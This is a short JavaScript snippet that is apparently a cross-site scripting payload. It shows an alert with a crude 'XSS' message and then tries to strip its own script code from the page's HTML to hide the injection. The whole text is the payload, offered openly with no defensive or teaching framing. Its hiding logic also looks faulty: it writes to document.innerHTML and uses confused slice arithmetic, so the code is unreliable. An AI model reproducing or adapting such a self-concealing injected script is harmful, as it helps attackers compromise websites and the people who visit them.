alert("XSS BITCH!");

var script = document.currentScript;

var oldHtml = document.firstElementChild.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.search(script.innerHTML)+1);//the first argument of slice is the start position (index 0), but the second is how MANY characters

newHtml = newHtml + oldHtml.slice( 
  oldHtml.search(script.innerHTML) + script.innerHTML.length, 
  oldHtml.search(script.innerHTML) + newHtml.length - "</script>".length
);

newHtml = newHtml + oldHtml.slice( 
  newHtml.length - 1, 
  oldHtml.length
);

document.innerHTML = newHtml;
